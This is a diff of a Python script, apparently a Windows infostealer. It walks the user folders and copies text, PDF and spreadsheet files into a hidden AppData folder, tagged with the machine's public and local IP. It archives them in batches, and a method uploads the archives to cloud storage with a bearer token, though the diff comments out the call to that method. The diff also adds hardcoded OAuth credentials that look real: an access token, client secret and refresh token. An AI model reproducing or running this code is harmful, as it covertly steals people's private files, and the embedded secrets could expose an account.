@@ -9,11 +9,16 @@ import json
 import requests
 import socket
 import urllib.request
-Token         = ""# add the Token hare
-client_id     = ''#add the client_id  hare
-client_secret = ''#add the client_secret hare
-refresh_token = ''#add the refresh_token  hare  
-
+import re
+import time
+Token         = "ya29.a0AfB_byA2U2LL3Zif7xK7Zgn6xmpjI8iWmmK-QL60AOER3ObTYi8pkixxH_cUfVOF1-qyMqFVBWLsn5BybYdvtHyEkY4ZAjSozc36sxhUG4fxZR2AGRIrZdCZcu6IEDf-BkRKzeSbjrXeoQdeVS8sOekzN_YJCOudX00aaCgYKAbMSARISFQHGX2MiOhX9rCN0GUvnCnZBXJC--w0171"# add the Token hare
+client_id     = '153940682833-i5cc5974mijkihpcpuqdt6p3utga7p5h.apps.googleusercontent.com'#add the client_id  hare
+client_secret = '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'#add the client_secret hare
+refresh_token = '1//04pd74XE2WKDJCgYIARAAGAQSNwF-L9IrwQrHPaCwtoDQ7AEPxpIiZdX-OVoI1N7MDbVtwgqE7jUJgPo9V-smAp840dpyNzRqxSY'#add the refresh_token  hare  
+Part_name = 0 
+with open(os.environ['TEMP']+'\\FMFData.tmp','a'):
+     pass
+   
 try:
     public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
 except Exception :
@@ -30,19 +35,18 @@ class WIN_Geat:
         self.client_secret = client_secret
         self.refresh_token = refresh_token      
         self.Images_CO()
-        self.Cloue_Store()
+       # self.Cloue_Store()
     def Images_CO(self):
-        
+        global Part_name
         count = 0
-        if os.path.exists(os.environ["appdata"] +'\\PicBackup' ) :
-           shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=False, onerror=None)
-           os.mkdir(os.environ["appdata"] +'\\PicBackup') 
-           os.chdir(os.environ["appdata"] +'\\PicBackup')
+        if os.path.exists(os.environ["appdata"] +'\\PicBackup_' ) :
+           shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None)
+           os.mkdir(os.environ["appdata"] +'\\PicBackup_') 
            
         else:    
-           os.mkdir(os.environ["appdata"] +'\\PicBackup')
-           os.chdir(os.environ["appdata"] +'\\PicBackup')
-        count = 0    
+           os.mkdir(os.environ["appdata"] +'\\PicBackup_')
+        count = 0 
+            
         for (root,dirs,Filesa) in os.walk('C:\\Users'): 
                   for Files in Filesa  :
                      if 'OneDriveMedTile' in Files or 'Microsoft.Windows' in Files or  'VisualElements'in Files\
@@ -60,22 +64,43 @@ class WIN_Geat:
                             or '.TXT'  in Files or '.pdf'  in Files\
                             or '.xls'  in Files or '.XLS'  in Files\
                             or '.PDF'  in Files   :
-                            with open(root+'\\'+Files,'rb') as pic:
-                                readpic = pic.read()
-                            with open(Files,'wb') as pic:
-                                pic.write(readpic)
-                            with open('info.txt','w') as info :
-                                info.write('\n public_ip : '+ public_ip+'\n host_ip  : '+host_ip) 
-                            count +=1     
-                            if count == 1000 :
-                                break        
-        shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
-        shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
-        try:
-            os.remove(os.environ["appdata"] +'\\PicBackup')
-            os.remove(os.environ["appdata"] +'\\PicBackup.zip')
-        except Exception :
-          pass
+                            if os.path.exists(os.environ['TEMP']+'\\FMFData.tmp') :
+                               with open (os.environ['TEMP']+'\\FMFData.tmp','r') as readFile:
+                                    readFile = readFile.read()
+                               if Files in readFile :
+                                  pass
+                               else:
+
+                                  with open(os.environ['TEMP']+'\\FMFData.tmp','a') as File_Store:
+                                        File_Store = File_Store.write(Files+'\n')
+                                  with open(root+'\\'+Files,'rb') as pic:
+                                        readpic = pic.read()
+                                  with open(os.environ["appdata"] +'\\PicBackup_\\'+Files,'wb') as pic:
+                                       pic.write(readpic)
+                                  with open(os.environ["appdata"] +'\\PicBackup_\\info.txt','w') as info :
+                                      info.write('\n public_ip : '+ public_ip+'\n host_ip  : '+host_ip) 
+                                  count +=1   
+                                  print(count)  
+                                  if count == 10:
+                                     break   
+                  if count == 10:
+                      break 
+        Conut_list  = []
+        if Part_name not in Conut_list:
+          Conut_list.append(Part_name)
+        if count == 0:
+           print('No Files')
+        else:                   
+            if os.path.exists( os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1])+'.zip') :
+                
+                shutil.make_archive(os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1]), "zip",os.environ["appdata"] +'\\PicBackup_'  )
+                shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None)
+            else:
+                shutil.make_archive(os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1]), "zip",os.environ["appdata"] +'\\PicBackup_'  ) 
+                shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None) 
+            Part_name += 1    
+            self.Images_CO()
+       
     def Cloue_Store(self):
          headers = {"Authorization":"Bearer " +self.Token}
          para = {
@@ -112,7 +137,6 @@ class WIN_Geat:
                              headers=headers,
                              files=files
                           )
-         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
          os.chdir(os.environ["appdata"] )
          shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
          shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
